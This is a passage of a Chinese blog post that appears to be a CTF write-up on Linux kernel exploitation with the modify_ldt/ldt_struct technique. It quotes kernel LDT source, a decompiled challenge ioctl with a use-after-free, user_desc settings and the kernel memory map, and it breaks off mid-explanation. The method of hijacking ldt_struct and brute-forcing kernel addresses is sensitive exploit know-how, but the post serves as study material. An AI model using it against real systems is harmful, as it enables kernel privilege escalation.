class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldmode)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">        LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">        <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">            error = -EINVAL;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">        <span class="keyword">if</span> (oldmode)</span><br><span class="line">            ldt.avl = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">        <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">    finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">            free_ldt_pgtables(mm);</span><br><span class="line">        free_ldt_struct(new_ldt);</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后会将新的ldt放到mm中，然后释放掉旧的ldt，这里主要需要注意的是如何生存一个新的ldt，可以看到是调用了alloc_ldt_struct函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct ldt_struct *<span class="title">alloc_ldt_struct</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(struct ldt_struct), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    BUILD_BUG_ON(LDT_ENTRY_SIZE != <span class="keyword">sizeof</span>(struct desc_struct));</span><br><span class="line">    alloc_size = num_entries * LDT_ENTRY_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen is very picky: it requires a page-aligned LDT that has no</span></span><br><span class="line"><span class="comment"> * trailing nonzero bytes in any page that contains LDT descriptors.</span></span><br><span class="line"><span class="comment"> * Keep it simple: zero the whole allocation and never allocate less</span></span><br><span class="line"><span class="comment"> * than PAGE_SIZE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">if</span> (alloc_size &gt; PAGE_SIZE)</span><br><span class="line">        new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_ldt-&gt;entries = (<span class="keyword">void</span> *)get_zeroed_page(GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!new_ldt-&gt;entries) &#123;</span><br><span class="line">        kfree(new_ldt);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The new LDT isn&#x27;t aliased for PTI yet. */</span></span><br><span class="line">    new_ldt-&gt;slot = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;nr_entries = num_entries;</span><br><span class="line">    <span class="keyword">return</span> new_ldt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里，kmalloc一个ldt_struct的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里其实可以ldt_struct的size为0x10，那么这里的利用思路是</p><ol><li>通过write_ldt控制ldt结构体</li><li>利用read_ldt进行爆破</li></ol><p>这里为什么使用爆破呢？可以看到在copy_to_user的过程中如果并没有完成的话时会返回一个负数，那么我们可以通过这一方法来爆破出内核地址。</p><h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><h3 id="2022-蓝帽杯-半决赛-Smurfs"><a href="#2022-蓝帽杯-半决赛-Smurfs" class="headerlink" title="2022 蓝帽杯 半决赛 Smurfs"></a>2022 蓝帽杯 半决赛 Smurfs</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep\</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>首先题目开启的保护只是smep和kaslr</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">kernel_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> size; <span class="comment">// r13d</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> *v7; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">char</span> *buf; <span class="comment">// r14</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> *v10; <span class="comment">// r12</span></span><br><span class="line">    __int64 v11; <span class="comment">// r14</span></span><br><span class="line">    __int64 buf_low; <span class="comment">// r13</span></span><br><span class="line">    add_args a1; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line">    __int64 v14; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> __int64))_fentry__)(file, cmd, arg);</span><br><span class="line">    v15 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( cmd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">8LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">2</span> &amp;&amp; addrList[LODWORD(a1.size)] )</span><br><span class="line">                    kfree();</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">0x18</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">2</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    v10 = addrList[LODWORD(a1.size)];</span><br><span class="line">                    <span class="keyword">if</span> ( v10 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( LODWORD(a1.buf) &lt;= <span class="number">8</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                            v11 = v14;</span><br><span class="line">                            buf_low = LODWORD(a1.buf);</span><br><span class="line">                            _check_object_size(addrList[LODWORD(a1.size)], LODWORD(a1.buf), <span class="number">0LL</span>);</span><br><span class="line">                            copy_from_user(v10, v11, buf_low);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(&amp;a1, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                size = a1.size;</span><br><span class="line">                <span class="keyword">if</span> ( LODWORD(a1.size) &lt;= <span class="number">0x20</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    v6 = _kmalloc(a1.size, <span class="number">0xCC0</span>LL);</span><br><span class="line">                    v7 = (<span class="keyword">char</span> *)v6;</span><br><span class="line">                    <span class="keyword">if</span> ( v6 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        buf = a1.buf;</span><br><span class="line">                        <span class="keyword">if</span> ( size &lt; <span class="number">0</span> )</span><br><span class="line">                            BUG();</span><br><span class="line">                        _check_object_size(v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size, <span class="number">0LL</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( !copy_from_user(v7, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> ( !addrList[<span class="number">0</span>] )</span><br><span class="line">                            &#123;</span><br><span class="line">                                v9 = <span class="number">0LL</span>;</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">                            &#125;</span><br><span class="line">                            v9 = <span class="number">1LL</span>;</span><br><span class="line">                            <span class="keyword">if</span> ( !addrList[<span class="number">1</span>] )</span><br><span class="line">                            &#123;</span><br><span class="line">                                LABEL_17:</span><br><span class="line">                                addrList[v9] = v7;</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ioctl函数存在三个功能，可以看到存在明显的UAF，但是在create时只能create两个堆块来使用，并且题目没有从内核读取数据到用户态的方法。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a><strong>利用过程</strong></h4><p>那么根据上面所说的modify_ldt的利用原理来看，我们如果存在一个0x10大小的object，我们是可以控制到ldt_struct的，在write_ldt函数要想顺利的执行到下面我们还需要控制一下user_desc结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>当执行完write_ldt函数后，ldt_struct是我们可控的了，所以我们需要考虑泄露地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">========================================================================================================================</span><br><span class="line">    Start addr    |   Offset   |     End addr     |  Size   | VM area description</span><br><span class="line">========================================================================================================================</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> <span class="number">0000000000000000</span> |    <span class="number">0</span>       | <span class="number">00007f</span>ffffffffff |  <span class="number">128</span> TB | user-space <span class="keyword">virtual</span> memory, different per mm</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> <span class="number">0000800000000000</span> | +<span class="number">128</span>    TB | ffff7fffffffffff | ~<span class="number">16</span>M TB | ... huge, almost <span class="number">64</span> bits wide hole of non-canonical</span><br><span class="line">                  |            |                  |         |     <span class="keyword">virtual</span> memory addresses up to the <span class="number">-128</span> TB</span><br><span class="line">                  |            |                  |         |     starting offset of kernel mappings.</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Kernel-space <span class="keyword">virtual</span> memory, shared between all processes:</span><br><span class="line">____________________________________________________________|___________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> ffff800000000000 | <span class="number">-128</span>    TB | ffff87ffffffffff |    <span class="number">8</span> TB | ... guard hole, also reserved <span class="keyword">for</span> hypervisor</span><br><span class="line"> ffff880000000000 | <span class="number">-120</span>    TB | ffff887fffffffff |  <span class="number">0.5</span> TB | LDT remap <span class="keyword">for</span> PTI</span><br><span class="line"> ffff888000000000 | <span class="number">-119.5</span>  TB | ffffc87fffffffff |   <span class="number">64</span> TB | direct mapping of all physical memory (page_offset_base)</span><br><span class="line"> ffffc88000000000 |  <span class="number">-55.5</span>  TB | ffffc8ffffffffff |  <span class="number">0.5</span> TB | ... unused hole</span><br><span class="line"> ffffc90000000000 |  <span class="number">-55</span>    TB | ffffe8ffffffffff |   <span class="number">32</span> TB | vmalloc/ioremap space (vmalloc_base)</span><br><span class="line"> ffffe90000000000 |  <span class="number">-23</span>    TB | ffffe9ffffffffff |    <span class="number">1</span> TB | ... unused hole</span><br><span class="line"> ffffea0000000000 |  <span class="number">-22</span>    TB | ffffeaffffffffff |    <span class="number">1</span> TB | <span class="keyword">virtual</span> memory <span class="built_in">map</span> (vmemmap_base)</span><br><span class="line"> ffffeb0000000000 |  <span class="number">-21</span>    TB | ffffebffffffffff |    <span class="number">1</span> TB | ... unused hole</span><br><span class="line"> ffffec0000000000 |  <span class="number">-20</span>    TB | fffffbffffffffff |   <span class="number">16</span> TB | KASAN shadow memory</span><br><span class="line">__________________|____________|__________________|_________|____________________________________________________________</span><br><span class="line">                                                            |</span><br><span class="line">                                                            | Identical layout to the <span class="number">56</span>-bit one from here on:</span><br><span class="line">____________________________________________________________|____________________________________________________________</span><br><span class="line">                  |            |                  |         |</span><br><span class="line"> fffffc0000000000 |   <span class="number">-4</span>    TB | fffffdffffffffff |    <span class="number">2</span> TB | ... unused hole</span><br><span class="line">                  |            |                  |         | vaddr_end <span class="keyword">for</span> KASLR</span><br><span class="line"> fffffe0000000000 |   <span class="number">-2</span>    TB | fffffe7fffffffff |  <span class="number">0.5</span> TB | cpu_entry_area mapping</span><br><span class="line"> fffffe8000000000 |   <span class="number">-1.5</span>  TB | fffffeffffffffff |  <span class="number">0.5</span> TB | ... unused hole</span><br><span class="line"> ffffff0000000000 |   <span class="number">-1</span>    TB | ffffff7fffffffff |  <span class="number">0.5</span> TB | %esp fixup stacks</span><br><span class="line"> ffffff8000000000 | <span class="number">-512</span>    GB | ffffffeeffffffff |  <span class="number">444</span> GB | ... unused hole</span><br><span class="line"> ffffffef00000000 |  <span class="number">-68</span>    GB | fffffffeffffffff |   <span class="number">64</span> GB | EFI region mapping space</span><br><span class="line"> ffffffff00000000 |   <span class="number">-4</span>    GB | ffffffff7fffffff |    <span class="number">2</span> GB | ... unused hole</span><br><span class="line"> ffffffff80000000 |   <span class="number">-2</span>    GB | ffffffff9fffffff |  <span class="number">512</span> MB | kernel text mapping, mapped to physical address <span class="number">0</span></span><br><span class="line"> ffffffff80000000 |<span class="number">-2048</span>    MB |                  |         |</span><br><span class="line"> ffffffffa0000000 |<span class="number">-1536</span>    MB | fffffffffeffffff | <span class="number">1520</span> MB | <span class="keyword">module</span> mapping space</span><br><span class="line"> ffffffffff000000 |  <span class="number">-16</span>    MB |                  |         |</span><br><span class="line">    FIXADDR_START | ~<span class="number">-11</span>    MB | ffffffffff5fffff | ~<span class="number">0.5</span> MB | kernel-internal fixmap range, variable size <span class="keyword">and</span> offset</span><br><span class="line"> ffffffffff600000 |  <span class="number">-10</span>    MB | ffffffffff600fff |    <span class="number">4</span> kB | legacy vsyscall ABI</span><br><span class="line"> ffffffffffe00000 |   <span class="number">-2</span>    MB | ffffffffffffffff |    <span class="number">2</span> MB | ... unused hole</span><br><span class="line">__________________|____________|__________________|_________|___________________________________________________________</span><br></pre></td></tr></table></figure><p>这里考虑搜索物理地址直接映射区</p><blockquote><p>物理地址直接映射区即 direct mapping area，即<strong>线性映射区</strong>（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，kmalloc 便从此处分配内存</p><p>而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 